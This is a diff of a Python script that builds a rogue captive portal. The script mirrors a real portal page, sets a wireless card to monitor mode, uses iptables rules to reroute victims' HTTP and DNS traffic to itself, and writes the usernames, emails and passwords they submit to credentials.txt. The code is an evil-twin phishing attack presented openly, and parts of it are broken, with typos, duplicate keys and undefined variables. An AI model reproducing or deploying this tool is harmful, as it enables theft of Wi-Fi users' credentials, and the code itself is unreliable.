@@ -1,19 +1,20 @@
-#relies on pybashish.py
 #!/usr/bin/python3
 import os
 import re
 import cgi
+import sys
 import cgitb
 import argparse
-import ipaddress
+import ipaddress 
 import traceback
 import subprocess
 import http.server
 from pathtools import path
 import socketserver as socketserver
 from http.server import HTTPServer as Webserver
+from core import PybashyRunFunction,error_printer
 from core import ExecutionPool,CommandSet,GenPerp_threader
-from core import FunctionSet,ModuleSet,Command
+from core import FunctionSet,ModuleSet,Command,run_test,CommandRunner
 #try:
 #    from urllib.parse import urlparse
 #except ImportError:
@@ -111,30 +112,18 @@ parser.add_argument('--',
 
 # These variables are used as settings
 #set to your appropriate ifaces
-moniface,iface='eth0','eth1'
-PORT=9090         # the port in which the captive portal web server listens
-IFACE="wlan2"      # the interface that captive portal protects
-IP_ADDRESS="192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
-filename='credentials.txt'
-hostlist , networkaddrpool = [] , []
-i1name, i2name,i3name  = 'username' , 'email' , 'submit'
-portalpage = '/portal/login.php.html'
-credentials = [[ 'nikos' , 'fotiou'] , # please keep this here at least commented, its to cite them.
-                ['user1' , 'password'],
-                ['user2' , 'password2'],
-                ['hacker' , 'root']]
-
-def error_printer(message):
-    exc_type, exc_value, exc_tb = sys.exc_info()
-    trace = traceback.TracebackException(exc_type, exc_value, exc_tb) 
-    try:
-        redprint( message + ''.join(trace.format_exception_only()))
-        traceback.format_list(trace.extract_tb(trace)[-1:])[-1]
-        blueprint('LINE NUMBER >>>' + str(exc_tb.tb_lineno))
-    except Exception:
-        yellow_bold_print("EXCEPTION IN ERROR HANDLER!!!")
-        redprint(message + ''.join(trace.format_exception_only()))
-
+#moniface,iface='eth0','eth1'
+#PORT=9090         # the port in which the captive portal web server listens
+#IFACE="wlan2"      # the interface that captive portal protects
+#IP_ADDRESS="192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
+#filename='credentials.txt'
+#hostlist , networkaddrpool = [] , []
+#i1name, i2name,i3name  = 'username' , 'email' , 'submit'
+#portalpage = '/portal/login.php.html'
+#credentials = [[ 'nikos' , 'fotiou'] , # please keep this here at least commented, its to cite them.
+#                ['user1' , 'password'],
+#                ['user2' , 'password2'],
+#                ['hacker' , 'root']]
 
 class GetPage():
     """"""
@@ -178,20 +167,58 @@ class GetPage():
             error_printer("[-] Shell Command failed!")
 
 class BackendServer():
-    def __init__(self, progargs, i1name = 'username',i2name = 'email', i3name = "password"):
-        #set these to the names of the inputs to catch them
-        self.i1name = i1name
-        self.i2name = i2name
-        self.i3name = i3name
-        self.input1 = formdata.getvalue(self.i1name)
-        self.input2 = formdata.getvalue(self.i2name)
-        self.input3 = formdata.getvalue(self.i3name)
-        self.formdata = cgi.FieldStorage()
-        self.portalpage = progargs.portalpage
-        self.PORT = progargs.port
-        self.ipaddress = progargs.ipaddress
-        self.iface = progargs.iface
+    def __init__(self, progargs, inames = ['username','email','password'] ):
+        '''
+iname are the inputs you are attempting to capture
+    pass it the names as strings in a list
+        - [str,str,str,str]
+        
+        '''
+        # basic variables for existance
+        self.formdata        = cgi.FieldStorage()
+        self.portalpage      = progargs.portalpage
+        self.PORT            = progargs.port
+        self.ipaddress       = progargs.ipaddress
+        self.iface           = progargs.iface
+        self.moniface        = progargs.moniface
 
+        #dynamically create the data sniffers
+        counter = 0
+        #set to the names of the inputs to catch them
+        # makes a new attribute containing the name of the html 
+        # form field to snag the data from
+        for inputname in inames:
+            setattr(self,"input" + str(counter +1), self.formdata.getvalue(inputname))
+
+    def RunServer(self):
+        # setup the core functions
+        # we need to establish the mitm network with the json 
+        # contained in EstablishMITMnetwork()
+        #execution pool to hold command set
+        self.exec_pool          = ExecutionPool()
+        #self.module_set         = ModuleSet('test1')
+        self.function_prototype = CommandSet()
+        #self.new_function       = FunctionSet()
+        #self.runner             = CommandRunner(exec_pool = self.exec_pool)
+        
+        #run tests from the core.py
+        run_test()
+        ###################################################
+        #       HERE IS WHERE THE WERVER IS STARTED
+        ###################################################
+        #set monitor mode on flagged interface
+        self.setmon()
+        PybashyRunFunction(self.EstablishMITMnetwork)
+        greenprint("Starting web server")
+        self.serveportal()
+
+    #sets monitor mode
+    def setmon(self):
+        try:
+            subprocess.check_output(["iwconfig", self.moniface,  "mode", "monitor"], stderr=subprocess.PIPE)
+            greenprint("[+] Monitor Mode Enabled")
+        except subprocess.CalledProcessError:
+            redprint("[-] Failed to set monitor mode")
 
     def serveportal(self):
         httpd = http.server.HTTPServer((ipaddress, PORT), CaptivePortal)
@@ -199,42 +226,25 @@ class BackendServer():
             httpd.serve_forever()
         except KeyboardInterrupt:
             pass
+
     def EstablishMITMnetwork(self):
-        {
-           'ls_etc' : { "command"         : "ls -la /etc" ,
-                        "info_message"    : "[+] Info Text",
-                        "success_message" : "[+] Command Sucessful", 
-                        "failure_message" : "[-] ls -la Failed! Check the logfile!"
-                    },
-            'ls_home' : { "command"         : "ls -la ~/"            ,
-                          "info_message"    : "[+] Info Text"        ,
-                          "success_message" : "[+] Command Sucessful", 
-                          "failure_message" : "[-] ls -la Failed! Check the logfile!"
-                        },
+        ''' functions as command payloads should not be called until the class is initialized'''
+        steps = {
         "InterfaceDown": {
             "command"         : "ip link set {0} down".format(self.iface),
             "info_message"    : "[+] Bringing down Interface : {}".format(self.iface),
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"
-            },
+                        },
         "AddInterface": {
-            "command"         : "ip addr add {0} dev {1}".format(IP_ADDRESS, iface),
+            "command"         : "ip addr add {0} dev {1}".format(self.ipaddress, self.iface),
             "info_message"    : "[+] Adding New Interface : {}".format(self.iface),
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
 
-#sets monitor mode
-#        try:
-#            p = subprocess.check_output(["iwconfig", moniface,  "mode", "monitor"], stderr=subprocess.PIPE)
-#            greenprint("[+] Monitor Mode Enabled")
-#        except subprocess.CalledProcessError as e:
-#            redprint("[-] Failed to set monitor mode")
-#        else:
-#            greenprint("[+] Monitor Mode Enabled")
-
         "InterfaceUp": {
-            "command"         : "ip link set {0} up".format(iface),
+            "command"         : "ip link set {0} up".format(self.iface),
             "info_message"    : "[+] Initializing Interface : {}".format(self.iface),
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
@@ -280,8 +290,8 @@ class BackendServer():
         #"status" : greenprint("[+]Setup a NAT environment"),
         
         "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(iface),
-            "info_message"    : "[+] enable ip Forwarding",
+            "command"         : "iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(self.iface),
+            "info_message"    : "[+] Setup a NAT environment",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -289,8 +299,8 @@ class BackendServer():
         #greenprint("[+]allow incomming from the outside on the monitor iface")
         
         "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -w 3 --append FORWARD --in-interface {0} -j ACCEPT".format(moniface),
-            "info_message"    : "[+] enable ip Forwarding",
+            "command"         : "iptables -w 3 --append FORWARD --in-interface {0} -j ACCEPT".format(self.moniface),
+            "info_message"    : "[+] [+]allow incomming from the outside on the monitor iface",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -299,8 +309,8 @@ class BackendServer():
         #greenprint("[+]allow UDP DNS resolution inside the NAT  via prerouting"),
         
         "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to {}".format(IP_ADDRESS),
-            "info_message"    : "[+] enable ip Forwarding",
+            "command"         : "iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to {}".format(self.ipaddress),
+            "info_message"    : "[+] Allow UDP DNS resolution inside the NAT  via prerouting",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -310,7 +320,7 @@ class BackendServer():
         
         "IPTablesDeleteChainNAT": {
             "command"         : "iptables -w 3 -A INPUT -i lo -j ACCEPT",
-            "info_message"    : "[+] enable ip Forwarding",
+            "info_message"    : "[+]Allow Loopback Connections",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -328,7 +338,7 @@ class BackendServer():
         
         "IPTablesDeleteChainNAT": {
             "command"         : "iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
-            "info_message"    : "[+] enable ip Forwarding",
+            "info_message"    : "[+] Allow Established and Related Incoming Connections",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -338,7 +348,7 @@ class BackendServer():
         
         "IPTablesDeleteChainNAT": {
             "command"         : "iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT",
-            "info_message"    : "[+] enable ip Forwarding",
+            "info_message"    : "[+] Allow Established Outgoing Connections",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -347,8 +357,8 @@ class BackendServer():
         #greenprint("[+]Internal to External")
         
         "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface),
-            "info_message"    : "[+] enable ip Forwarding",
+            "command"         : "iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(self.moniface, self.iface),
+            "info_message"    : "[+] Internal to External",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
@@ -356,34 +366,63 @@ class BackendServer():
         
         "IPTablesDeleteChainNAT": {
             "command"         : "iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP",
-            "info_message"    : "[+] enable ip Forwarding",
+            "info_message"    : "[+] Drop Invalid Packets",
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
         
         
-        subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", "53", "-j" ,"ACCEPT"])
+        "IPTablesDeleteChainNAT": {
+            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport 53 -j ACCEPT",
+            "info_message"    : "[+] Drop Invalid Packets",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            },
         
-        subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"])
+        "IPTablesDeleteChainNAT": {
+            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p udp --dport 53 -j ACCEPT",
+            "info_message"    : "[+] Drop Invalid Packets",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            },
         
-        redprint(".. Allow traffic to captive portal")
+        #redprint(".. Allow traffic to captive portal")
         
-        subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", str(PORT),"-d", IP_ADDRESS, "-j" ,"ACCEPT"])
+        "IPTablesDeleteChainNAT": {
+            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport {} -d {} -j ACCEPT".format(self.port, self.ipaddress),
+            "info_message"    : "[+]Allow traffic to captive portal",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            },
         
-        redprint(".. Block all other traffic")
+        #redprint(".. Block all other traffic")
         
-        subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-j" ,"DROP"])
-        
-        ###################################################
-        #
-        #       HERE IS WHERE THE WERVER IS STARTED
-        #
-        #
-        ###################################################
-        greenprint("Starting web server")
-        self.serveportal()
-        greenprint("Redirecting HTTP traffic to captive portal")
-        subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", IP_ADDRESS+":"+str(PORT)])
+        "IPTablesBlockAll": {
+            "command"         : "iptables -w 3 -A FORWARD -i IFACE -j DROP",
+            "info_message"    : "[+] Block all other traffic",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            },
+        #greenprint("Redirecting HTTP traffic to captive portal")
+        "IPTablesDeleteChainNAT": {
+            "command"         : "iptables -t nat -A PREROUTING -i IFACE -p tcp --dport 80 -j DNAT --to-destination {}:{}".format(self.ipaddress, self.port),
+            "info_message"    : "[+] Redirecting HTTP traffic to captive portal",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            }
+        }
+
+class Redirect(http.server.SimpleHTTPRequestHandler):
+    def __init__(self):
+        pass
+    def ServeInitRedirect(self):
+        #whenever this script is called you get sent to the portal first
+        print('Content-Type : text/html')
+        print('Location : /' + portalpage)
+        print("")
+        print('<html>\n<head>\n<meta http-equiv="refresh" content="0;url='+ ipadrress + PORT + portalpage + '" />\n</head>\n<body></body>\n</html>')
+
+
 
 class CaptivePortal(http.server.SimpleHTTPRequestHandler):
     #this is the index of the captive portal
@@ -417,8 +456,20 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
 
     def authpassthrough(self):
         redprint('Updating IP tables to allow {0} through'.format(remote_IP))
-        subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
-        subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
+        payload = {
+        "IPTablesAcceptNAT": {
+            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(remote_IP),
+            "info_message"    : "[+] Drop Invalid Packets",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            },
+        "IPTablesDeleteChainNAT": {
+            "command"         : "iptables -I FORWARD -s {} -j ACCEPT".formnat(remote_IP),
+            "info_message"    : "[+] Drop Invalid Packets",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            }
+        }
 
     def authenticate(self, username, password):
         for username_password in credentials:
@@ -440,7 +491,7 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         try:
             with open(filename, 'ab') as filehandle:
                 input1 = self.formdata.getvalue(i1name)
-                input2 = self.formdata.getvalue(i2n` ame)
+                input2 = self.formdata.getvalue(i2name)
                 input3 = self.formdata.getvalue(i3name)
                 filehandle.write(formdata.getvalue(i1name))
                 filehandle.write('\n')
@@ -449,8 +500,22 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
                 filehandle.close()
         except Exception as e:
             raise
-        subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
-        subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
+
+        payload = {
+        "": {
+            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(remote_ip),
+            "info_message"    : "[+] Drop Invalid Packets",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            },
+        "IPTablesDeleteChainNAT": {
+            "command"         : "iptables -I FORWARD -s {}, -j ACCEPT".format(remote_IP),
+            "info_message"    : "[+] Drop Invalid Packets",
+            "success_message" : "[+] Command Sucessful", 
+            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            }
+        }
+
         self.wfile.write("You are now authorized. Navigate to any URL")
 
     def do_GET(self):
@@ -478,36 +543,28 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         password = form.getvalue("password")
         authenticate(username,password)
 
-def savecredentials(filename):
-    try:
-        with open(filename, 'ab') as filehandle:
-            input1 = formdata.getvalue(i1name)
-            input2 = formdata.getvalue(i2name)
-            input3 = formdata.getvalue(i3name)
-            filehandle.write(formdata.getvalue(i1name))
-            filehandle.write('\n')
-            filehandle.write(formdata.getvalue(i2name))
-            filehandle.write('\n\n')
-            filehandle.close()
-    except Exception as e:
-        raise
-
-#whenever this script is called you get sent to the portal first
-print('Content-Type : text/html')
-print('Location : /' + portalpage)
-print("")
-print('<html>\n<head>\n<meta http-equiv="refresh" content="0;url='ipadrress + PORT + portalpage + '" />\n</head>\n<body></body>\n</html>')
-
-savecredentials()
+    def savecredentials(self, filename):
+        try:
+            with open(filename, 'ab') as filehandle:
+                input1 = formdata.getvalue(i1name)
+                input2 = formdata.getvalue(i2name)
+                input3 = formdata.getvalue(i3name)
+                filehandle.write(formdata.getvalue(i1name))
+                filehandle.write('\n')
+                filehandle.write(formdata.getvalue(i2name))
+                filehandle.write('\n\n')
+                filehandle.close()
+        except Exception as e:
+            raise
 
 if __name__ == "__main__":
     arguments  = parser.parse_args()
+    # we can either run the progrma to capture a captive portal
     if arguments.mirror == True :
         wget_thing = GetPage(arguments.directory_prefix,
                          arguments.target,
                          arguments.useragent,
                          arguments.wget_options)
+    # or serve a captured portal
     elif arguments.portal == True:
-        BackendServer(arguments.portalpage, arguments.port,arguments.ipaddress)
-        EstablishMITMnetwork()
-        CaptivePortal()
+        BackendServer(arguments)
